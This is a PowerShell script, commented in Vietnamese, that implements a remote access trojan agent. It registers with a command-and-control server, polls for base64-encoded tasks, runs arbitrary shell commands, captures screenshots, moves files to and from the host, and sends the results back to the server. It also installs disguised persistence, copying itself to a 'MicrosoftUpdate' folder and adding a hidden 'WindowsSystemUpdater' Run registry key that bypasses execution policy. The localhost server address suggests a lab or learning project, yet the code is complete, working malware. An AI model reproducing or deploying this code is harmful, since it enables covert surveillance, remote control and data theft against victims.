# --- CẤU HÌNH ---
$server_url = "http://127.0.0.1:8080"
$agent_id = $null
$sleep_time = 3

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# --- HÀM CHỨC NĂNG ---

function Register-Agent {
    $hostname = $env:COMPUTERNAME
    try {
        $response = Invoke-RestMethod -Uri "$server_url/reg" -Method POST -Body @{name=$hostname}
        return $response
    } catch { return $null }
}

function Get-Task {
    try {
        return Invoke-RestMethod -Uri "$server_url/tasks/$agent_id" -Method GET
    } catch { return $null }
}

function Send-Result ($output_str) {
    try {
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($output_str)
        $encoded = [System.Convert]::ToBase64String($bytes)
        Invoke-RestMethod -Uri "$server_url/results/$agent_id" -Method POST -Body @{result=$encoded}
    } catch {}
}

function Capture-Screen {
    try {
        $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $bmp = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
        $graphics = [System.Drawing.Graphics]::FromImage($bmp)
        $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
        $ms = New-Object System.IO.MemoryStream
        $bmp.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png)
        $base64_img = [Convert]::ToBase64String($ms.ToArray())
        $graphics.Dispose(); $bmp.Dispose(); $ms.Dispose()
        return "[IMAGE] $base64_img"
    } catch { return "Error: $_" }
}

# Hàm cài đặt Persistence
function Install-Persistence {
    try {
        # Cách 1: Thử lấy đường dẫn chuẩn
        $current_script = $MyInvocation.MyCommand.Path

        # Cách 2: Nếu null, thử dùng biến môi trường của script (chỉ có trên PS 3.0+)
        if (-not $current_script) {
            $current_script = $PSCommandPath
        }

        # Cách 3: (Fallback) Nếu vẫn null, lấy luôn thư mục hiện tại + tên file
        if (-not $current_script) {
            $current_script = Join-Path (Get-Location).Path "agent.ps1"
        }

        # Kiểm tra lại xem file có thật sự tồn tại không
        if (-not (Test-Path $current_script)) {
            return "Error: Could not locate agent.ps1 at path: $current_script"
        }
        
        $hidden_dir = "$env:APPDATA\MicrosoftUpdate"
        $hidden_script = "$hidden_dir\updater.ps1"
        
        # Tạo thư mục ẩn và copy script
        if (-not (Test-Path $hidden_dir)) { New-Item -ItemType Directory -Path $hidden_dir | Out-Null }
        Copy-Item -Path $current_script -Destination $hidden_script -Force
        
        # Thêm vào Registry Run Key
        $cmd_trigger = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$hidden_script`""
        $reg_path = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        
        New-ItemProperty -Path $reg_path -Name "WindowsSystemUpdater" -Value $cmd_trigger -PropertyType String -Force | Out-Null
        
        return "Persistence installed successfully! Path: $hidden_script"
    }
    catch {
        return "Persistence failed: $_"
    }
}

# --- MAIN LOOP ---

Write-Host "[*] Agent Started."
$agent_id = Register-Agent
if (-not $agent_id) { Write-Host "[-] Failed."; Exit }
Write-Host "[+] Assigned ID: $agent_id"

while ($true) {
    $encoded_task = Get-Task
    
    if (-not [string]::IsNullOrEmpty($encoded_task)) {
        try {
            $bytes = [System.Convert]::FromBase64String($encoded_task)
            $cmd_full = [System.Text.Encoding]::UTF8.GetString($bytes)
            Write-Host "[*] Processing: $cmd_full"
            
            $parts = $cmd_full -split " "
            $type = $parts[0]

            if ($type -eq "screenshot") {
                $result = Capture-Screen
            }
            # [MỚI] Xử lý lệnh persistence
            elseif ($type -eq "persistence") {
                $result = Install-Persistence
            }
            elseif ($type -eq "upload") {
                if ($parts.Count -eq 3) {
                    $path = $parts[1]; $content = $parts[2]
                    try {
                        [System.IO.File]::WriteAllBytes($path, [System.Convert]::FromBase64String($content))
                        $result = "Uploaded: $path"
                    } catch { $result = "Error: $_" }
                }
            }
            elseif ($type -eq "download") {
                if ($parts.Count -ge 2) {
                    $path = $parts[1]
                    try {
                        $b64 = [Convert]::ToBase64String([System.IO.File]::ReadAllBytes($path))
                        $name = [System.IO.Path]::GetFileName($path)
                        $result = "[FILE] $name $b64"
                    } catch { $result = "Error: $_" }
                }
            }
            else {
                $result = cmd /c $cmd_full 2>&1 | Out-String
            }
        } catch { $result = "Error: $_" }
        Send-Result -output_str $result
    }
    Start-Sleep -Seconds $sleep_time
}